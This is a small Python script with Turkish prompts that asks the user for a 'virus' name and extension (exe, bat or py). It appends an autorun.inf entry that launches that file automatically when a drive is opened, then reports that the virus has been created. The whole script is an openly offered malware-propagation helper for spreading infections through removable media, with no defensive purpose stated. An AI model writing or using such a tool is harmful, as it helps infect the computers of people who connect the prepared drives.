import os
print('''

Virüsünüzün uzantısı nedir?

1-Exe

2-Bat

3-Py

''')
autorn = input("Seçim Yapınız > ")
if(autorn=="1"):
	ad = input("Virüsünüzün adını giriniz > ")
	dosya = open("autorun.inf","a")
	butun = (ad+".exe")


	dosya.write('''[autorun]
open='''+butun)
	print("\033[92mVirüsünüz Bulunduğunuz Dizine Oluşturuldu!")

elif(autorn=="2"):
	ad = input("Virüsünüzün adını giriniz > ")
	dosya = open("autorun.inf","a")
	butun = (ad+".bat")


	dosya.write('''[autorun]
open='''+butun)
	print("\033[92mVirüsünüz Bulunduğunuz Dizine Oluşturuldu!")


elif(autorn=="3"):
	ad = input("Virüsünüzün adını giriniz > ")
	dosya = open("autorun.inf","a")
	butun = (ad+".py")


	dosya.write('''[autorun]
open='''+butun)
	print("\033[92mVirüsünüz Bulunduğunuz Dizine Oluşturuldu!")

